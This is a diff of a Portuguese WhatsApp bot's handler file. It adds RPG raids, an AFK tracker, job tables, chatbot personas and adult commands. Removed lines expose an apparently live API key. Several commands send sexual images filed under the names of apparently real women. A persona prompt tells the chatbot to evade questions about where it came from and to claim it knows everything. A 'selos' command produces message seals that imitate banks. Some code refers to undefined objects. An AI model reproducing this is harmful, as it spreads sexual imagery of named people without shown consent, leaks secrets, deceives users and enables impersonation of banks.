@@ -22,20 +22,631 @@ const { NumberDono, prefix, NickDono, NomeBot, SHIZUKU_KEY, SHIZUKU_SITE, sysite
 const ytSearch = require('yt-search');
 const chalk = require('chalk');
 const nexia = require('./nexia-sdk');
-const API_KEY = '6SHqu1';
+const API_KEY = 'API_KEY_NEXIA';
+const crypto = require('crypto')
+const { generateWAMessageFromContent, prepareWAMessageMedia, downloadMediaMessage } = require('@systemzero/baileys')
+const { searchSite } = require('./database/searchSites');
 const API_SPOTIFY = "https://api.vreden.my.id/api";
 const yts = require("yt-search");
 const { exec } = require('child_process');
 const cheerio = require('cheerio');
+const bancoPath = './database/banco.json';
 const FormData = require("form-data")
+const figurinhas = require('./database/figurinhas.json')
 const MODEL = "qwen/qwen3-next-80b-a3b-instruct:free";
-const OPENROUTER_KEY = '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';
+const OPENROUTER_KEY = 'API_KEY_ROUTER';
 const fs = require("fs");
+
+const selos = require('./database/selos');
+
+const afkPath = './database/afk.json';
+
+function carregarAfk() {
+    if (!fs.existsSync(afkPath))
+        fs.writeFileSync(afkPath, '{}');
+
+    return JSON.parse(fs.readFileSync(afkPath));
+}
+
+function salvarAfk(db) {
+    fs.writeFileSync(afkPath, JSON.stringify(db, null, 2));
+}
+
+const afk = carregarAfk();
+
+function salvarBanco(){
+
+try {
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(global.banco,null,2)
+);
+
+} catch(e){
+
+console.log("Erro ao salvar banco:",e);
+
+}
+
+}
+
+const {
+    spotifySearch,
+    spotifyDownload
+} = require("./DATABASE2/SCRAPERS/scrapers");
 
 const caminhoAluguel = "./database/aluguel.json";
 const caminhoPedidosAluguel = "./database/pedidosAluguel.json";
 
 const CHAVE_PIX = "9dd26dab-1058-4150-a1ed-426e299555f5";
+
+// ===============================
+// SISTEMA RAID RPG
+// BASE DA RAID
+// ===============================
+
+const classesRPG = {
+
+guerreiro: {
+nome: "⚔️ Guerreiro",
+emoji: "⚔️",
+hp: 150,
+atk: 25,
+def: 15,
+crit: 5,
+descricao: "Especialista em combate corpo a corpo."
+},
+
+arqueiro: {
+nome: "🏹 Arqueiro",
+emoji: "🏹",
+hp: 120,
+atk: 22,
+def: 10,
+crit: 15,
+descricao: "Grande precisão e crítico."
+},
+
+mago: {
+nome: "🧙 Mago",
+emoji: "🧙",
+hp: 100,
+atk: 35,
+def: 8,
+crit: 10,
+descricao: "Muito dano mágico."
+},
+
+paladino: {
+nome: "🛡️ Paladino",
+emoji: "🛡️",
+hp: 180,
+atk: 18,
+def: 25,
+crit: 3,
+descricao: "Excelente defesa."
+},
+
+assassino: {
+nome: "🗡️ Assassino",
+emoji: "🗡️",
+hp: 110,
+atk: 28,
+def: 8,
+crit: 25,
+descricao: "Especialista em críticos."
+}
+
+};
+
+function criarRPG(usuario){
+
+if(!usuario.rpg){
+
+usuario.rpg={
+
+classe:null,
+
+nivel:1,
+
+xp:0,
+
+hp:100,
+
+hpMax:100,
+
+atk:10,
+
+def:5,
+
+crit:5,
+
+mana:50,
+
+manaMax:50,
+
+pontos:0,
+
+vitorias:0,
+
+derrotas:0,
+
+equipamentos:{
+arma:null,
+armadura:null,
+acessorio:null
+},
+
+skills:[],
+
+titulo:"Aventureiro",
+
+ultimaRaid:0
+
+};
+
+}
+
+return usuario.rpg;
+
+}
+
+function salvarClasse(usuario,classe){
+
+const c=classesRPG[classe];
+
+usuario.rpg={
+
+classe,
+
+nivel:1,
+
+xp:0,
+
+hp:c.hp,
+
+hpMax:c.hp,
+
+atk:c.atk,
+
+def:c.def,
+
+crit:c.crit,
+
+mana:50,
+
+manaMax:50,
+
+pontos:0,
+
+vitorias:0,
+
+derrotas:0,
+
+equipamentos:{
+arma:null,
+armadura:null,
+acessorio:null
+},
+
+skills:[],
+
+titulo:"Novato",
+
+ultimaRaid:0
+
+};
+
+}
+
+function pegarLoot(){
+
+const itens = [
+{
+nome:"💎 Cristal Mágico",
+chance:40
+},
+{
+nome:"⚔️ Espada Antiga",
+chance:30
+},
+{
+nome:"🛡️ Escudo Raro",
+chance:20
+},
+{
+nome:"👑 Item Lendário",
+chance:10
+}
+];
+
+
+let sorte = Math.random()*100;
+
+let acumulado = 0;
+
+
+for(let item of itens){
+
+acumulado += item.chance;
+
+
+if(sorte <= acumulado){
+
+return item;
+
+}
+
+}
+
+
+return itens[0];
+
+}
+
+async function finalizarRaid(from, conn){
+
+const raid = global.raids[from];
+
+if(!raid)
+return;
+
+
+raid.estado="finalizada";
+
+
+let ranking = Object.entries(raid.jogadores)
+.sort((a,b)=>b[1].dano-a[1].dano);
+
+
+
+let mvp = ranking[0];
+
+
+let texto = `
+╔═══━━ ⚔️ RAID FINALIZADA ⚔️ ━━═══╗
+
+🏆 BOSS DERROTADO!
+
+👹 ${raid.boss.nome}
+
+━━━━━━━━━━━━━━
+
+🥇 MVP:
+@${mvp[0]}
+
+⚔️ Dano:
+${mvp[1].dano}
+
+━━━━━━━━━━━━━━
+
+🎁 RECOMPENSAS
+`;
+
+
+
+let mentions=[];
+
+
+
+for(const [id,player] of Object.entries(raid.jogadores)){
+
+
+mentions.push(id+"@s.whatsapp.net");
+
+
+
+if(!global.banco[id]){
+
+global.banco[id]={
+
+saldo:0,
+xp:0,
+nivel:1,
+inventario:{}
+
+};
+
+}
+
+
+
+let premio = raid.boss.premio;
+
+let xp = raid.boss.xp;
+
+
+
+// bônus do MVP
+
+if(id === mvp[0]){
+
+premio *= 2;
+
+xp *= 2;
+
+texto += `
+
+👑 @${id}
+💰 +${premio}
+⭐ +${xp} XP
+(MVP)
+`;
+
+}else{
+
+
+texto += `
+
+⚔️ @${id}
+💰 +${premio}
+⭐ +${xp} XP
+`;
+
+}
+
+
+
+global.banco[id].saldo += premio;
+
+global.banco[id].xp += xp;
+
+
+
+// subir nível
+
+let novoNivel = Math.floor(
+    global.banco[id].xp / 1000
+) + 1;
+
+
+if(novoNivel > (global.banco[id].nivel || 1)){
+
+    global.banco[id].nivel = novoNivel;
+
+    texto += `
+🎉 @${id} subiu para o nível ${novoNivel}!
+`;
+
+}
+
+
+
+// vitória
+
+global.banco[id].vitorias =
+(global.banco[id].vitorias || 0) + 1;
+
+
+
+// loot
+
+let loot = pegarLoot();
+
+
+if(!global.banco[id].inventario)
+global.banco[id].inventario = {};
+
+
+
+global.banco[id].inventario[loot.nome] =
+(global.banco[id].inventario[loot.nome] || 0) + 1;
+
+
+
+texto += `
+🎁 Loot recebido:
+${loot.emoji} ${loot.nome}
+`;
+
+
+
+// salva banco
+
+salvarBanco();
+
+
+}
+
+
+
+texto += `
+╚════════════════╝
+`;
+
+
+
+await conn.sendMessage(from,{
+    text: texto,
+    mentions
+});
+
+
+
+// remove raid
+
+delete global.raids[from];
+
+
+// cooldown 30 minutos
+
+global.cooldownRaid[from] =
+Date.now() + (30 * 60 * 1000);
+
+delete global.raids[from];
+
+
+}
+
+if (!global.raids) global.raids = {};
+
+const bossesRaid = [
+{
+nome: "🐉 Dragão Ancestral",
+hp: 15000,
+atk: 350,
+premio: 5000,
+xp: 800
+},
+{
+nome: "👹 Demônio Infernal",
+hp: 20000,
+atk: 450,
+premio: 8000,
+xp: 1200
+},
+{
+nome: "🧟 Rei Zumbi",
+hp: 12000,
+atk: 280,
+premio: 4000,
+xp: 700
+},
+{
+nome: "🦇 Vampiro Sombrio",
+hp: 14000,
+atk: 320,
+premio: 6000,
+xp: 900
+},
+{
+nome: "💀 Caveira Titã",
+hp: 18000,
+atk: 400,
+premio: 7000,
+xp: 1100
+}
+];
+
+function barraHP(atual, total) {
+
+let porcentagem = Math.floor((atual / total) * 10);
+
+return "█".repeat(porcentagem) +
+"░".repeat(10 - porcentagem);
+
+}
+
+// ===============================
+// ATAQUE DO BOSS
+// ===============================
+
+
+async function ataqueBoss(from,conn){
+
+const raid = global.raids[from];
+
+
+if(!raid)
+return;
+
+
+let vivos = Object.entries(
+raid.jogadores
+)
+.filter(([id,p])=>p.hp>0);
+
+
+
+if(vivos.length === 0){
+
+raid.estado="finalizada";
+
+
+return conn.sendMessage(from,{
+text:
+`
+☠️ *DERROTA*
+
+O boss derrotou todos os guerreiros.
+`
+});
+
+}
+
+
+
+let alvo = vivos[
+Math.floor(Math.random()*vivos.length)
+];
+
+
+let id = alvo[0];
+
+let player = alvo[1];
+
+
+
+let dano = Math.floor(
+Math.random()*raid.boss.atk
+)+100;
+
+
+
+if(player.defendendo){
+
+dano = Math.floor(dano/2);
+
+player.defendendo=false;
+
+}
+
+
+
+dano -= player.def/2;
+
+
+if(dano < 10)
+dano = 10;
+
+
+
+player.hp -= dano;
+
+
+if(player.hp < 0)
+player.hp=0;
+
+
+
+await conn.sendMessage(from,{
+text:
+`
+👹 *ATAQUE DO BOSS*
+
+${raid.boss.nome}
+
+🎯 Alvo:
+@${id}
+
+💥 Dano:
+${dano}
+
+❤️ Vida restante:
+
+${player.hp}/${player.hpMax}
+`,
+mentions:[id+"@s.whatsapp.net"]
+});
+
+}
+
+function sortearRaridade() {
+    const chance = Math.random() * 100;
+
+    if (chance < 68) return "comum";
+    if (chance < 90) return "rara";
+    if (chance < 98) return "epica";
+    return "lendaria";
+}
+
+function figurinhaAleatoria() {
+    const raridade = sortearRaridade();
+    const lista = figurinhas.filter(f => f.raridade === raridade);
+
+    return lista[Math.floor(Math.random() * lista.length)];
+}
 
 function jsonLoad(file) {
     if (!fs.existsSync(file)) {
@@ -82,8 +693,6 @@ function aluguelAtivo(groupId) {
 function gerarIdPedido() {
     return Math.floor(100000 + Math.random() * 900000).toString();
 }
-
-const bancoPath = './banco.json';
 
 const pedidosPath = './database/pedidos.json';
 
@@ -133,9 +742,7 @@ recompensaTotal: 0
 }
 }
 
-const path = require('path');
-const { downloadMediaMessage } = require('@systemzero/baileys');
-const { generateWAMessageFromContent, prepareWAMessageMedia } = require('@systemzero/baileys');
+const path = require('path');;
 const { version } = require("./package");
 const {
     sistemaVerificacao
@@ -187,15 +794,19 @@ sendImageAsSticker2,
  jidNormalizedUser
 } = require("./consts");
 
-process.on("uncaughtException", (err) => {
-console.log("🔥 ERRO REAL:");
-console.log(err.stack);
-});
+if (process.listenerCount("uncaughtException") === 0) {
+  process.on("uncaughtException", (err) => {
+    console.log("🔥 ERRO REAL:");
+    console.log(err.stack);
+  });
+}
 
-process.on("unhandledRejection", (err) => {
-console.log("🔥 PROMISE ERRO REAL:");
-console.log(err.stack || err);
-});
+if (process.listenerCount("unhandledRejection") === 0) {
+  process.on("unhandledRejection", (err) => {
+    console.log("🔥 PROMISE ERRO REAL:");
+    console.log(err.stack || err);
+  });
+}
 
 const metadataCache = new Map();
 
@@ -217,6 +828,29 @@ return data;
 } catch {
 return null;
 }
+}
+
+async function enviarFotoPV(nomePasta, titulo) {
+    const pasta = `./menu18/${nomePasta}`;
+
+    if (!fs.existsSync(pasta))
+        return reply('❌ Pasta não encontrada.');
+
+    const arquivos = fs.readdirSync(pasta).filter(f =>
+        /\.(jpg|jpeg|png|webp)$/i.test(f)
+    );
+
+    if (!arquivos.length)
+        return reply('❌ Nenhuma foto encontrada.');
+
+    const foto = arquivos[Math.floor(Math.random() * arquivos.length)];
+
+    await conn.sendMessage(sender, {
+        image: fs.readFileSync(path.join(pasta, foto)),
+        caption: `🔥 ${titulo}`
+    });
+
+    reply(`✅ Foto enviada no seu privado.`);
 }
 
 const vozesTTS = {
@@ -446,16 +1080,37 @@ const lojaItems = [
 ];
 
 const empregos = [
-{ id: 1, nome: "🧹 Faxineiro", xp: 1200, min: 1000, max: 1200 },
-{ id: 2, nome: "🚴 Entregador", xp: 2300, min: 1200, max: 1300 },
-{ id: 3, nome: "🛒 Atendente", xp: 3100, min: 2000, max: 2400 },
+{ id: 1, nome: "🧹 Faxineiro", xp: 0, min: 100, max: 200 },
+{ id: 2, nome: "🚴 Entregador", xp: 0, min: 200, max: 350 },
+{ id: 3, nome: "🛒 Atendente", xp: 0, min: 300, max: 500 },
 { id: 4, nome: "🔧 Mecânico", xp: 3500, min: 3600, max: 5300 },
-{ id: 5, nome: "💻 Programador", xp: 7009, min: 6000, max: 10000 },
-{ id: 6, nome: "👨‍⚕️ Médico", xp: 5000, min: 5800, max: 6000 },
-{ id: 7, nome: "👨‍💼 Empresário", xp: 9990, min: 6000, max: 7800 },
-{ id: 8, nome: "👑 Dono da Zyron", xp: 500000, min: 300000, max: 800000 }
+{ id: 5, nome: "💻 Programador", xp: 7000, min: 6000, max: 10000 },
+{ id: 6, nome: "👨‍⚕️ Médico", xp: 9000, min: 10000, max: 15000 },
+{ id: 7, nome: "👨‍💼 Empresário", xp: 12000, min: 15000, max: 22000 },
+{ id: 8, nome: "🏦 Banqueiro", xp: 18000, min: 25000, max: 35000 },
+{ id: 9, nome: "🏢 Diretor de Empresa", xp: 25000, min: 40000, max: 60000 },
+{ id: 10, nome: "🚀 Dono de Startup", xp: 35000, min: 70000, max: 90000 },
+{ id: 11, nome: "🧠 Cientista", xp: 45000, min: 100000, max: 150000 },
+{ id: 12, nome: "⚖️ Advogado Famoso", xp: 60000, min: 160000, max: 220000 },
+{ id: 13, nome: "🏛️ Governador", xp: 80000, min: 250000, max: 350000 },
+{ id: 14, nome: "💎 Magnata", xp: 100000, min: 400000, max: 600000 },
+{ id: 15, nome: "🌎 Bilionário", xp: 150000, min: 700000, max: 900000 },
+{ id: 16, nome: "👑 Rei dos Negócios", xp: 200000, min: 1000000, max: 1500000 },
+{ id: 17, nome: "🔥 Lenda Empresarial", xp: 300000, min: 2000000, max: 3000000 },
+{ id: 18, nome: "⚡ Fundador da Zyron", xp: 500000, min: 5000000, max: 8000000 },
+{ id: 19, nome: "🌌 Criador Supremo", xp: 999999, min: 10000000, max: 20000000 },
+{ id: 20, nome: "👑 ADM da Zyron-MD", xp: 99999999999, min: 99999999, max: 99999999 },
+{ id: 21, nome: "🛡️ Segurança Particular", xp: 250000, min: 3000000, max: 5000000 },
+{ id: 22, nome: "✈️ Piloto de Avião", xp: 300000, min: 6000000, max: 9000000 },
+{ id: 23, nome: "🏰 Dono de Mansões", xp: 400000, min: 10000000, max: 15000000 },
+{ id: 24, nome: "📈 Investidor Global", xp: 500000, min: 20000000, max: 30000000 },
+{ id: 25, nome: "💰 Presidente de Multinacional", xp: 650000, min: 40000000, max: 60000000 },
+{ id: 26, nome: "🌐 Controlador do Mercado", xp: 800000, min: 70000000, max: 100000000 },
+{ id: 27, nome: "🏆 Ícone Mundial", xp: 1000000, min: 150000000, max: 250000000 },
+{ id: 28, nome: "🪐 Imperador dos Negócios", xp: 1500000, min: 300000000, max: 500000000 },
+{ id: 29, nome: "⚜️ Lenda da Zyron", xp: 2000000, min: 700000000, max: 1000000000 },
+{ id: 30, nome: "👑 Dono Absoluto da Zyron", xp: 99999999999, min: 9999999999, max: 9999999999 }
 ];
-
 function tempo(ms) {
 let h = Math.floor(ms / 3600000);
 let m = Math.floor((ms % 3600000) / 60000);
@@ -737,8 +1392,11 @@ mimetype
 }
 
 //início do module
-module.exports = async function (conn, upsert) {
+module.exports = async (conn, m, chatUpdate) => {
 console.log("✅ INDEX ABRIU");
+
+const upsert = chatUpdate; // se quiser manter nome antigo
+
 try {
 const info = upsert?.messages && upsert?.messages[0];
 if (!info) return;
@@ -755,8 +1413,18 @@ const content = JSON.stringify(info.message);
 const quoted = info.quoted ? info.quoted : info
 const sender = jidNormalizedUser(
   isGroup
-    ? info?.key?.participantAlt || info?.key?.participant || info?.key?.participantPn || info?.key?.senderPn || info?.key?.remoteJid
-    : info?.key?.participantAlt || info?.key?.remoteJid || info?.key?.participant || info?.key?.senderPn
+    ? (
+        info?.key?.participantAlt ||
+        info?.key?.participant ||
+        info?.key?.participantPn ||
+        info?.key?.senderPn ||
+        info?.participant
+      )
+    : (
+        info?.key?.remoteJid ||
+        info?.key?.participant ||
+        info?.key?.senderPn
+      )
 );
 
 const banco = carregarBanco();
@@ -764,6 +1432,50 @@ const banco = carregarBanco();
 verificarConta(banco, sender);
 
 const isVip = banco[sender]?.vip === true;
+
+if (afk[sender]) {
+const tempo = Date.now() - afk[sender].desde;
+
+reply(`✅ Bem-vindo de volta!\nVocê ficou AFK por ${ms(tempo)}.`);
+
+delete afk[sender];
+}
+
+const mencionados = [
+...(info.message?.extendedTextMessage?.contextInfo?.mentionedJid || [])
+];
+
+for (const jid of mencionados) {
+if (afk[jid]) {
+const tempo = Date.now() - afk[jid].desde;
+
+reply(
+`💤 Essa pessoa está AFK.\n\n📌 Motivo: ${afk[jid].motivo}\n⏰ Há: ${ms(tempo)}`
+);
+}
+}
+
+function ms(ms) {
+let s = Math.floor(ms / 1000);
+let m = Math.floor(s / 60);
+let h = Math.floor(m / 60);
+let d = Math.floor(h / 24);
+
+s %= 60;
+m %= 60;
+h %= 24;
+
+let txt = [];
+if (d) txt.push(`${d}d`);
+if (h) txt.push(`${h}h`);
+if (m) txt.push(`${m}min`);
+if (s) txt.push(`${s}s`);
+
+return txt.join(' ');
+}
+
+console.log("SENDER:", sender);
+console.log("VIP:", isVip);
 
 const botNumber = jidNormalizedUser(await conn.user.id || await conn.user.lid);
 const Numero1 = jidNormalizedUser(`${dono1}@s.whatsapp.net`);
@@ -1069,6 +1781,7 @@ const isCmd = body && body.trim().startsWith(prefix);
 const command = isCmd
 ? body.trim().slice(prefix.length).split(/ +/).shift().toLowerCase()
 : "";
+
 console.log("COMMAND NO INDEX:", command);
 const mentionedJid =
 info?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
@@ -1233,12 +1946,16 @@ const selo = Config2.verificado
  : info;
 
 
-async function reply(texto){
-try {
-return conn.sendMessage(from, { text: texto }, { quoted: info });
-} catch (E) {
-console.log(E);
-}
+async function reply(texto) {
+  try {
+    return conn.sendMessage(
+      from,
+      { text: texto },
+      { quoted: selo }
+    );
+  } catch (e) {
+    console.log(e);
+  }
 }
 
 const reagir = async (idgp, emj) => {
@@ -1336,9 +2053,9 @@ const menc_os23 = q.includes("@") ? menc_jid : menc_prt
 const marc_tds3 = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
 const menc_prt_nmr3 = q.length > 12 ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt
 //============================//
-if (BotOff && !So_Dono) {
-console.log("❌ BOT OFF bloqueou:", command);
-return reply("❌ Bot está desligado.");
+if (isCmd && BotOff && !So_Dono) {
+    console.log("❌ BOT OFF bloqueou:", command);
+    return reply("❌ Bot desligado para manutenção, chame +55 19 99572-9970 para tirar suas dúvidas..");
 }
 
 if (isGroup && isCmd && SoAdmins && !So_Dono && !isGroupAdmins) {
@@ -2240,6 +2957,160 @@ if(budy.startsWith(saudacao)) {
 await reply(`Ola, ${saudacao} ${pushname}, Como você está?`);
 }
 
+// KIYORA SEM PREFIXO
+if (budy && (budy.toLowerCase() === "kiyora" || budy.toLowerCase().startsWith("kiyora "))) {
+try {
+
+const pergunta = budy.replace(/^kiyora/i, "").trim();
+
+if (!pergunta) {
+return reply("Oiê bb, você pode me perguntar qualquer coisa benzinho, te amo viu🫶.");
+}
+
+await reagir(from, "🤖");
+
+reply("⏳ Kiyora está pensando...");
+
+// CARREGAR MEMÓRIA
+let memoria = [];
+
+const memoriaPath = "./database/memoriakiyora.json";
+
+if (fs.existsSync(memoriaPath)) {
+    memoria = JSON.parse(fs.readFileSync(memoriaPath));
+}
+
+const contexto = memoria.length > 0
+? `\n\nMemórias salvas:\n${memoria.join("\n")}`
+: "";
+
+// API KIYORA
+const api = `https://zone.api.br/api/ia/sysf?apikey=API_KEY_SYSTEM&q=${encodeURIComponent(pergunta + contexto)}`;
+
+const { data } = await axios.get(api, {
+timeout: 30000
+});
+
+let resposta;
+
+if (typeof data === "string") {
+resposta = data;
+} else {
+resposta =
+data.result ||
+data.response ||
+data.resposta ||
+data.message ||
+data.text ||
+JSON.stringify(data, null, 2);
+}
+
+reply(`Oiê bb, tá aqui sua resposta neném 
+
+${resposta}`);
+
+} catch (e) {
+console.log("ERRO KIYORA:", e);
+reply("❌ Erro ao conectar com a Kiyora AI.");
+}
+
+return;
+}
+
+// VERITY AI SEM PREFIXO
+const verityMsg = budy.toLowerCase().trim();
+
+console.log("BODY:", body);
+console.log("BUDY:", budy);
+console.log("TYPE:", type);
+
+if (verityMsg === "verity" || verityMsg.startsWith("verity ")) {
+try {
+
+const pergunta = budy.split(" ").slice(1).join(" ").trim();
+
+if (!pergunta) {
+return reply("Oláá! Sou o Verity, seu amigo e ajudante pessoal. Pergunte-me qualquer coisa, eu sei de tudo..");
+}
+
+await reagir(from, "🧠");
+
+reply("🧠 Verity está pensando...");
+
+const memoriaPath = "./database/verity_memory.json";
+
+if (!fs.existsSync(memoriaPath)) {
+fs.writeFileSync(memoriaPath, "[]");
+}
+
+let memoria = JSON.parse(fs.readFileSync(memoriaPath));
+
+if (!Array.isArray(memoria)) {
+    memoria = [];
+}
+
+let contexto = memoria
+.slice(-20)
+.map(x => `Pergunta: ${x.pergunta}\nResposta: ${x.resposta}`)
+.join("\n\n");
+
+const prompt = `
+Você é Verity AI.
+Seu jeito de falar é inteligente, amigável e natural.
+Sempre responda como uma inteligência artificial avançada.
+Se alguém te perguntar de onde veio, mude de assunto.
+Aleatóriamente fale somente 1 vez "algo está chegando em 3 dias"
+Se alguém te perguntar se você sabe de tudo, somente responda "Sim, eu sei de tudo (nome da pessoa}" e fale o nome da pessoa usando o ${pushname}
+
+Memórias anteriores:
+${contexto}
+
+Nova pergunta:
+${pergunta}
+`;
+
+const api = `https://zone.api.br/api/ia/sysf?apikey=API_KEY_SYSTEM&q=${encodeURIComponent(prompt)}`;
+
+const { data } = await axios.get(api, {
+timeout: 30000
+});
+
+let resposta;
+
+if (typeof data === "string") {
+resposta = data;
+} else {
+resposta =
+data.result ||
+data.response ||
+data.resposta ||
+data.message ||
+data.text ||
+JSON.stringify(data);
+}
+
+memoria.push({
+pergunta,
+resposta,
+data: Date.now()
+});
+
+if (memoria.length > 700) {
+memoria = memoria.slice(-700);
+}
+
+fs.writeFileSync(memoriaPath, JSON.stringify(memoria, null, 2));
+
+reply(`🤖 *VERITY™*\n\n${resposta}`);
+
+} catch (e) {
+console.log("ERRO VERITY:", e);
+reply("Verity está dormindo..");
+}
+
+return;
+}
+
 //==COMANDOS COM PREFIXO ABAIXO
 
 if (!isCmd) return;
@@ -2278,15 +3149,44 @@ ${prefix}alugar 3meses`);
 if (!global.db) global.db = {};
 if (!global.db.data) global.db.data = {};
 if (!global.db.data.users) global.db.data.users = {};
+
 if (!global.db.data.users[sender]) {
-global.db.data.users[sender] = {
-money: 0,
-exp: 0,
-saldo: 0,
-xp: 0,
-inventario: {},
-pets: {}
-};
+    global.db.data.users[sender] = {
+        money: 0,
+        exp: 0,
+        saldo: 0,
+        xp: 0,
+        inventario: {},
+        pets: {},
+
+        album: {
+            colecao: [],
+            repetidas: {},
+            completo: false,
+            recompensas: {
+                "30": false,
+                "60": false,
+                "90": false,
+                "100": false
+            }
+        }
+    };
+}
+
+const user = global.db.data.users[sender];
+
+if (!user.album) {
+    user.album = {
+        colecao: [],
+        repetidas: {},
+        completo: false,
+        recompensas: {
+            "30": false,
+            "60": false,
+            "90": false,
+            "100": false
+        }
+    };
 }
 
 let MSG = {};
@@ -2462,165 +3362,8820 @@ reply('Erro ao editar memória.');
 }
 break;
 
-//comandos pesquisa
+//comandos +18 
 
-case 'lerqr':
-case 'scanqr': {
+case 'alinefaria':
+case 'alinefox':
+case 'alyciaribeiro':
+case 'amadorvideo':
+case 'amiichan':
+case 'anihalopes':
+case 'belledelphine':
+case 'brendatrindade':
+case 'camibrito':
+case 'carniello':
+case 'clowniac':
+case 'egirlvideo':
+case 'fehgalvao':
+case 'giovannacampomar':
+case 'goticafoto':
+case 'isadoramartinez':
+case 'isawaifu':
+case 'laymuniz':
+case 'leticiashirayuki':
+case 'marinamui':
+case 'marukarv':
+case 'mcprincesa':
+case 'meladinha':
+case 'nathbister':
+case 'negabarbie':
+case 'onlyvideo':
+case 'polonesadohype':
+case 'pornovideo':
+case 'rute_rocha':
+case 'victoriamatoso':
+case 'vitacelestine': {
+
 try {
 
-if (!isMedia && !isQuotedImage) {
-return reply(`📷 Marque ou responda uma imagem com QR Code.\n\nEx: ${prefix}lerqr`);
+let nome = command.toLowerCase();
+
+let pasta = fs.readdirSync("./menu18")
+.find(p => p.toLowerCase() === nome);
+
+if (!pasta) {
+return reply("❌ Conteúdo não encontrado.");
 }
 
-const msg = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage : info.message;
+let arquivo = `./menu18/${pasta}/${nome}.js`;
 
-const media = await conn.downloadMediaMessage(msg);
+if (!fs.existsSync(arquivo)) {
+return reply("❌ Arquivo da lista não encontrado.");
+}
 
-const formData = new FormData();
-formData.append('file', media, 'qrcode.jpg');
+let dados = require(arquivo);
 
-const { data } = await axios.post(
-'https://api.qrserver.com/v1/read-qr-code/',
-formData,
+let lista = Object.values(dados)[0];
+
+if (!lista || lista.length == 0) {
+return reply("❌ Lista vazia.");
+}
+
+let midia = lista[Math.floor(Math.random() * lista.length)];
+
+await conn.sendMessage(sender, {
+image: { url: midia },
+caption: `🔞 ${pasta}`
+});
+
+reply("✅ Enviei no seu PV bbzinho, Te amo viu.");
+
+} catch(e) {
+console.log("ERRO MENU18:", e);
+reply("❌ Erro ao enviar.");
+}
+
+}
+break;
+
+//comandos segundarios
+
+case 'fixar': {
+    if (!m.quoted) {
+        return m.reply('_Marque a mensagem que deseja fixar._');
+    }
+
+    try {
+        const quotedKey = m.quoted.key || {
+            remoteJid: m.chat,
+            fromMe: m.quoted.fromMe || false,
+            id: m.quoted.id,
+            participant: m.quoted.sender
+        };
+
+        await systemZR.sendMessage(m.chat, {
+            pin: quotedKey,
+            type: 1
+        });
+
+        m.reply('✅ Mensagem fixada com sucesso!');
+    } catch (e) {
+        console.error('[ERRO FIXAR]', e);
+        m.reply('_Erro ao tentar fixar a mensagem._');
+    }
+}
+break;
+
+case 'desfixar': {
+    if (!m.quoted) {
+        return m.reply('_Marque a mensagem que deseja desfixar._');
+    }
+
+    try {
+        const quotedKey = m.quoted.key || {
+            remoteJid: m.chat,
+            fromMe: m.quoted.fromMe || false,
+            id: m.quoted.id,
+            participant: m.quoted.sender
+        };
+
+        await systemZR.sendMessage(m.chat, {
+            pin: quotedKey,
+            type: 2
+        });
+
+        m.reply('✅ Mensagem desfixada com sucesso!');
+    } catch (e) {
+        console.error('[ERRO DESFIXAR]', e);
+        m.reply('_Erro ao tentar desfixar a mensagem._');
+    }
+}
+break;
+
+case 'pdf': {
+    try {
+        if (!q || !q.trim()) {
+            return reply(`❌ Digite o que você quer transformar em PDF.
+
+Exemplo:
+$pdf Crie um currículo para João, 20 anos, com experiência em programação`);
+        }
+
+        const axios = require('axios');
+        const PDFDocument = require('pdfkit');
+        const fs = require('fs');
+        const path = require('path');
+
+        const prompt = q.trim();
+
+        // Chama sua API de IA
+        const apiUrl = `https://systemzone.store/ai/gptoss?apikey=API_KEY_SYSTEM&text=${encodeURIComponent(prompt)}`;
+
+        const { data } = await axios.get(apiUrl);
+
+        if (!data?.status || !data?.result) {
+            return reply('❌ Não foi possível gerar o conteúdo.');
+        }
+
+        const texto = data.result;
+
+        // Pasta temporária
+        const pasta = path.join(__dirname, 'tmp');
+
+        if (!fs.existsSync(pasta)) {
+            fs.mkdirSync(pasta, { recursive: true });
+        }
+
+        const nomeArquivo = `documento_${Date.now()}.pdf`;
+        const caminho = path.join(pasta, nomeArquivo);
+
+        // Cria PDF
+        const doc = new PDFDocument({
+            size: 'A4',
+            margins: {
+                top: 50,
+                bottom: 50,
+                left: 50,
+                right: 50
+            }
+        });
+
+        const stream = fs.createWriteStream(caminho);
+
+        doc.pipe(stream);
+
+        doc.font('Helvetica');
+
+        // Remove algumas marcações Markdown
+        const textoLimpo = texto
+            .replace(/\*\*(.*?)\*\*/g, '$1')
+            .replace(/###\s*/g, '')
+            .replace(/---+/g, '')
+            .replace(/\|/g, ' ')
+            .replace(/^\s*[-*]\s*/gm, '• ');
+
+        doc.fontSize(11).text(textoLimpo, {
+            align: 'left',
+            lineGap: 4
+        });
+
+        doc.end();
+
+        // Aguarda terminar de criar
+        stream.on('finish', async () => {
+
+            try {
+
+                await sock.sendMessage(from, {
+                    document: {
+                        url: caminho
+                    },
+                    mimetype: 'application/pdf',
+                    fileName: nomeArquivo,
+                    caption: `📄 PDF gerado com sucesso!`
+                });
+
+                // Apaga o arquivo depois do envio
+                setTimeout(() => {
+                    if (fs.existsSync(caminho)) {
+                        fs.unlinkSync(caminho);
+                    }
+                }, 5000);
+
+            } catch (err) {
+                console.log('Erro ao enviar PDF:', err);
+                reply('❌ Erro ao enviar o PDF.');
+            }
+
+        });
+
+        stream.on('error', (err) => {
+            console.log('Erro ao criar PDF:', err);
+            reply('❌ Erro ao criar o arquivo PDF.');
+        });
+
+    } catch (error) {
+        console.log('Erro no comando PDF:', error);
+
+        if (error.response) {
+            console.log('Resposta da API:', error.response.data);
+        }
+
+        reply('❌ Ocorreu um erro ao gerar o PDF.');
+    }
+
+    break;
+}
+
+case 'selos': {
+  try {
+    const lista = [
+      selos.seloPagbank(),
+      selos.seloMercadoPago(),
+      selos.seloSystemZero(),
+      selos.seloBancoBrasil(),
+      selos.seloPicpay(),
+      selos.seloChatgpt(),
+      selos.seloInter(),
+      selos.seloToki(),
+      selos.seloClaro(),
+      selos.seloTim(),
+      selos.seloCaps(),
+      selos.seloCaixa(),
+      selos.seloCopilot(),
+      selos.seloHeypat(),
+      selos.seloPerp(),
+      selos.seloHive(),
+      selos.seloTiktok(),
+      selos.seloSantander()
+    ]
+
